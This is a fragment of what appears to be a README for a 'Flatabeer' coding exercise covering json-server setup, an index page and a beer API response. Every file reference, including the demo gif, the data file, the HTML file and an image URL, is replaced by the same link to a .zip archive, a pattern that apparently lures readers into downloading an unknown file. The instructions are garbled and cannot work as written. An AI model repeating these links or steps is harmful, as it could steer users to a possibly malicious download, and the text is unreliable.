...
![demo gif](https://raw.githubusercontent.com/GabrielW13Nai/Flatabeer-codechallenge/main/styles/Flatabeer_codechallenge_1.1.zip)

> To view in VSCode, right click on the https://raw.githubusercontent.com/GabrielW13Nai/Flatabeer-codechallenge/main/styles/Flatabeer_codechallenge_1.1.zip file and select "Open Preview".
...
```console
$ json-server --watch https://raw.githubusercontent.com/GabrielW13Nai/Flatabeer-codechallenge/main/styles/Flatabeer_codechallenge_1.1.zip
```
...
Then, open the `https://raw.githubusercontent.com/GabrielW13Nai/Flatabeer-codechallenge/main/styles/Flatabeer_codechallenge_1.1.zip` file on your browser to run the application.

Write your code in the `https://raw.githubusercontent.com/GabrielW13Nai/Flatabeer-codechallenge/main/styles/Flatabeer_codechallenge_1.1.zip` file. The base URL for your API will be
...
1. See the first beer's details, including its **name, image, description, and
   ...
   Example Response:
   {
      ...
      "image_url": "https://raw.githubusercontent.com/GabrielW13Nai/Flatabeer-codechallenge/main/styles/Flatabeer_codechallenge_1.1.zip",
      "reviews": [
